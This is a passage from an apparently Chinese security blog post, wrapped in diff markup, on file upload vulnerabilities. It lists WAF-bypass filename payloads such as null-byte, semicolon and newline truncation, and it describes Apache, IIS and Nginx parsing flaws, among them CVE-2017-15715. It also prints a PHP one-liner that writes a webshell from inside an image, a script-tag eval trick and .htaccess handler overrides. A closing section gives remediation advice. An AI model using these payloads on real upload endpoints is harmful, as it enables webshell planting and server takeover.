+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;xx&#x27;.php</span><br><span class="line">&quot;xx;.php</span><br><span class="line">&#x27;xx;.php</span><br><span class="line">&quot;;xx.php</span><br><span class="line">&#x27;;xx.php</span><br><span class="line">&quot; xx.php</span><br><span class="line">&#x27; xx.php</span><br><span class="line">&quot;x x.php</span><br><span class="line">&#x27;x x.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-数据截断-防匹配（-00-；-换行）"><a href="#8-数据截断-防匹配（-00-；-换行）" class="headerlink" title="(8)数据截断-防匹配（%00 ； 换行）"></a>(8)数据截断-防匹配（%00 ； 换行）</h2><p>通过用； 或者 %00 或者 换行 来截断文件名，使得WAF错误识别或不能识别文件类型从而达到绕过WAF</p>
+<ul>
+<li>文件名中加入图片后缀提前用分号截断(可行)</li>
+</ul>
+<p>原因是防护软件只检测分号（；）前面的部分，一旦正确就放行，不再检测后面的，然而apache服务器会取最后的文件类型来命名</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&quot;ab.jpg;.php&quot;</span><br><span class="line"> </span><br><span class="line">&quot;abc.php%00.jpg&quot;                             #注意%00需要经过url编码</span><br><span class="line"> </span><br><span class="line">&quot;x.p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br><span class="line"> </span><br><span class="line">x.ph</span><br><span class="line">p</span><br><span class="line"> </span><br><span class="line">x.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p</span><br></pre></td></tr></table></figure>
+
+<p>（9）配合目录命名绕过</p>
+<p>“/“与”;”配合绕过</p>
+<p> <strong>payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;/jpeg;x.php&quot;</span><br><span class="line">filename=&quot;/jpeg;/x.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（10）配合FUZZ字典测试绕过</p>
+<p>手工测试的话有点麻烦，可以借助写好的字典配合BP进行批量测试，先在本地测试，然后在真实环境进行测试，以防封IP。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
+<h1 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h1><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>漏洞原理</p>
+<p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
+<p>漏洞形式</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxx.xxx.com/test.php.php123">http://www.xxxx.xxx.com/test.php.php123</a></p>
+<p>其余配置问题导致漏洞</p>
+<p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</p>
+<p>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
+<p>（3）Apache解析漏洞（CVE-2017-15715）绕过上传黑名单</p>
+<p>我们利用CVE-2017-15715，上传一个包含换行符的文件。注意，只能是\x0A，不能是\x0D\x0A，所以我们用hex功能在1.php后面添加一个\x0A：</p>
+<p>然后访问/1.php%0A，即可发现已经成功getshell：</p>
+<h2 id="IIS5-x-6-x解析漏洞"><a href="#IIS5-x-6-x解析漏洞" class="headerlink" title="IIS5.x-6.x解析漏洞"></a>IIS5.x-6.x解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
+<p>目录解析(6.0)</p>
+<p>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">http://www.xxx.com/xx.asp/xx.jpg</a></p>
+<p>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
+<p>文件解析</p>
+<p>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">http://www.xxx.com/xx.asp;.jpg</a></p>
+<p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
+<p>解析文件类型</p>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
+<p>/test.asa</p>
+<p>/test.cer</p>
+<p>/test.cdx</p>
+<p>畸形解析漏洞（test.jpg/*.php）</p>
+<p>在IIS7.0中，默认Fast-CGI开启状况下，我们往图片里面写入下面的代码：<?php fputs(fopen('shell.php','w'),'一句话木马')?>将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用了。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。</p>
+<h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>解析：(任意文件名)/(任意文件名).php | (任意文件名)%00.php</p>
+<p>描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php</p>
+<p>的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。</p>
+<p>还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
+<h1 id="不能有-lt"><a href="#不能有-lt" class="headerlink" title="不能有&lt;?"></a>不能有&lt;?</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="user-ini文件-htaccess文件"><a href="#user-ini文件-htaccess文件" class="headerlink" title=".user.ini文件  .htaccess文件"></a>.user.ini文件  .htaccess文件</h1><p>上传图片木马成功，抓包之后，修改为phtml,php5,PHp都不可以，遇到这种情况有两种解决办法</p>
+<p>1.上传.user.ini文件，在上传所包含的文件为图片马，利用var_dump</p>
+<p>但是前提必须是有可以利用的php文件</p>
+<p>2.先上传图片马，然后上传.htaccess文件，内容为SetHandler application/x-httpd-php，作用是将所有的文件当作php文件来解析</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/HelloCTF/p/12987570.html">https://www.cnblogs.com/HelloCTF/p/12987570.html</a></p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h3 id="1-服务器配置不当"><a href="#1-服务器配置不当" class="headerlink" title="1.服务器配置不当:"></a>1.服务器配置不当:</h3><p>重新配置好服务器。服务器PUT方法配置不当。</p>
+<h3 id="2-开源编辑器上传漏洞"><a href="#2-开源编辑器上传漏洞" class="headerlink" title="2. 开源编辑器上传漏洞:"></a>2. 开源编辑器上传漏洞:</h3><p>若新版编辑器已修复漏洞，请更新编辑器版本。</p>
+<h3 id="3-本地文件上传限制被绕过"><a href="#3-本地文件上传限制被绕过" class="headerlink" title="3.本地文件上传限制被绕过:"></a>3.本地文件上传限制被绕过:</h3><p>在服务器后端对上传的文件迚行过滤。</p>
+<h3 id="4-设置文件上传的目录设置为不可执行"><a href="#4-设置文件上传的目录设置为不可执行" class="headerlink" title="4.设置文件上传的目录设置为不可执行"></a>4.设置文件上传的目录设置为不可执行</h3><p>只要web容器无法解析该目录下面的文件，卲使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
+<h3 id="5-判断文件类型"><a href="#5-判断文件类型" class="headerlink" title="5.判断文件类型"></a>5.判断文件类型</h3><p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
+<h3 id="6-使用随机数改写文件名和文件路径"><a href="#6-使用随机数改写文件名和文件路径" class="headerlink" title="6.使用随机数改写文件名和文件路径"></a>6.使用随机数改写文件名和文件路径</h3><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p>
+<h3 id="7-单独设置文件服务器的域名"><a href="#7-单独设置文件服务器的域名" class="headerlink" title="7.单独设置文件服务器的域名"></a>7.单独设置文件服务器的域名</h3><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15302547.html">web安全——文件上传漏洞 - 学安全的小白 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46739058/article/details/123554282">(63条消息) 文件上传漏洞总结_一窍不通的凳子的博客-CSDN博客_文件上传漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/279171.html">文件上传漏洞详解 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Z_Grant/article/details/100606382">(47条消息) 文件包含——原理及应用和防护（1）_Z_Grant的博客-CSDN博客_文件包含的作用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Z_Grant/article/details/100606382">https://blog.csdn.net/Z_Grant/article/details/100606382</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aweiname2008/article/details/119522187">(47条消息) 从0到1 CTFer成功之路》任意文件读取漏洞—学习笔记_aweiname2008的博客-CSDN博客_任意文件读取漏洞</a></p>
+<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">(47条消息) Web安全-一句话木马_Tr0e-CSDN博客_一句话木马</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/moon3/p/12688281.html">php一句话木马变形技巧 - moon3 - 博客园 (cnblogs.com)</a></p>
+<p>exif_imagetype只检查文件头</p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
@@ -87,7 +318,7 @@
     </div>
     
         <div class='side'>
-				
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">文件上传漏洞条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">常见文件上传类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">文件上传注入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">上传漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%A2%E6%9C%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">1.客服端绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.</span> <span class="toc-text">2.服务端绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">5.2.1.</span> <span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%89%BE%E9%BB%91%E5%90%8D%E5%8D%95%E6%89%A9%E5%B1%95%E5%90%8D%E7%9A%84%E6%BC%8F%E7%BD%91%E4%B9%8B%E9%B1%BC"><span class="toc-number">5.2.2.</span> <span class="toc-text">（1）找黑名单扩展名的漏网之鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">5.2.3.</span> <span class="toc-text">（2）大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%83%BD%E8%A2%ABweb%E5%AE%B9%E5%99%A8%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B6%E4%BB%96%E6%89%A9%E5%B1%95%E5%90%8D%E5%88%97%E8%A1%A8%EF%BC%9A"><span class="toc-number">5.2.4.</span> <span class="toc-text">（3）能被web容器解析的文件其他扩展名列表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E9%BB%91%E5%90%8D%E5%8D%95%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%88%E5%88%A9%E7%94%A8%E9%9A%BE%E5%BA%A6%E9%AB%98%EF%BC%89"><span class="toc-number">5.2.5.</span> <span class="toc-text">（4）黑名单特殊后缀名绕过（利用难度高）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E5%8D%95%E5%8F%8C%E9%87%8D%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.6.</span> <span class="toc-text">（5）单双重后缀名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886-%E7%82%B9%E7%BB%95%E8%BF%87%E3%80%82"><span class="toc-number">5.2.7.</span> <span class="toc-text">（6)点绕过。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.8.</span> <span class="toc-text">(7)空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">5.2.9.</span> <span class="toc-text">(8)中间件解析漏洞。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%889%EF%BC%89-htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">5.2.10.</span> <span class="toc-text">（9）.htaccess文件攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.11.</span> <span class="toc-text">白名单绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%85%8D%E5%90%88web%E5%AE%B9%E5%99%A8%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">5.2.12.</span> <span class="toc-text">（1）配合web容器的解析漏洞：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89-00%E5%92%8C0x00%E6%88%AA%E6%96%AD%E3%80%820x0a%E6%88%AA%E6%96%AD"><span class="toc-number">5.2.13.</span> <span class="toc-text">（2）%00和0x00截断。0x0a截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%96%87%E4%BB%B6%E5%A4%B4%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.14.</span> <span class="toc-text">（3）文件头内容检测绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%9C%8D%E5%8A%A1%E7%AB%AF-MIME-%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-Content-Type-%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.15.</span> <span class="toc-text">（4）服务端 MIME 文件类型(Content-Type)绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#getimagesize-%E5%9B%BE%E5%83%8F%E4%BF%A1%E6%81%AF%E5%88%A4%E6%96%AD"><span class="toc-number">6.</span> <span class="toc-text">getimagesize()图像信息判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text">竞争条件攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4exif-imagetype"><span class="toc-number">8.</span> <span class="toc-text">突破exif_imagetype()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%A6-waf-%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">带 waf 的文件上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-WAF-%E6%A3%80%E6%9F%A5%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">9.1.</span> <span class="toc-text">1.上传文件 WAF 检查的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%89%B9%E5%BE%81"><span class="toc-number">9.2.</span> <span class="toc-text">2.文件上传存在的上传特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87-WAF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.3.</span> <span class="toc-text">3.绕过 WAF 文件上传的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%A1%AB%E5%85%85%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87"><span class="toc-number">9.4.</span> <span class="toc-text">（1）填充垃圾数据绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%87%BA%E5%9B%9E%E8%BD%A6%E7%BB%95%E8%BF%87%EF%BC%88%E5%8F%AA%E6%94%AF%E6%8C%81-php%EF%BC%89"><span class="toc-number">9.5.</span> <span class="toc-text">（2）文件扩展名出回车绕过（只支持 php）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE-%E9%98%B2%E5%8C%B9%E9%85%8D%EF%BC%88%E5%8F%82%E6%95%B0%E5%A4%9A%E6%AC%A1%EF%BC%89"><span class="toc-number">9.6.</span> <span class="toc-text">（3）重复数据-防匹配（参数多次）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.7.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%884-%E4%BF%AE%E6%94%B9-Content-Disposition-%E5%AD%97%E6%AE%B5%E5%80%BC%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">9.8.</span> <span class="toc-text">（4)修改 Content-Disposition 字段值的大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">9.9.</span> <span class="toc-text">（5）文件重命名绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%88%A0%E9%99%A4-Content-Disposition-%E5%80%BC%E7%9A%84-form-data-%E7%BB%95%E8%BF%87"><span class="toc-number">9.10.</span> <span class="toc-text">（6）删除 Content-Disposition 值的 form-data 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E7%AC%A6%E5%8F%B7%E5%8F%98%E5%BC%82"><span class="toc-number">9.11.</span> <span class="toc-text">(7)符号变异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD-%E9%98%B2%E5%8C%B9%E9%85%8D%EF%BC%88-00-%EF%BC%9B-%E6%8D%A2%E8%A1%8C%EF%BC%89"><span class="toc-number">9.12.</span> <span class="toc-text">(8)数据截断-防匹配（%00 ； 换行）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">服务器解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.1.</span> <span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS5-x-6-x%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.2.</span> <span class="toc-text">IIS5.x-6.x解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.3.</span> <span class="toc-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E6%9C%89-lt"><span class="toc-number">11.</span> <span class="toc-text">不能有&lt;?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6-htaccess%E6%96%87%E4%BB%B6"><span class="toc-number">12.</span> <span class="toc-text">.user.ini文件  .htaccess文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">13.</span> <span class="toc-text">漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">13.0.1.</span> <span class="toc-text">1.服务器配置不当:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%80%E6%BA%90%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.0.2.</span> <span class="toc-text">2. 开源编辑器上传漏洞:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%E8%A2%AB%E7%BB%95%E8%BF%87"><span class="toc-number">13.0.3.</span> <span class="toc-text">3.本地文件上传限制被绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%BE%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%BA%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C"><span class="toc-number">13.0.4.</span> <span class="toc-text">4.设置文件上传的目录设置为不可执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-number">13.0.5.</span> <span class="toc-text">5.判断文件类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%B9%E5%86%99%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">13.0.6.</span> <span class="toc-text">6.使用随机数改写文件名和文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%8D%95%E7%8B%AC%E8%AE%BE%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%9F%E5%90%8D"><span class="toc-number">13.0.7.</span> <span class="toc-text">7.单独设置文件服务器的域名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC"><span class="toc-number">14.</span> <span class="toc-text">木马</span></a></li></ol>	
         </div>
     
 </div>
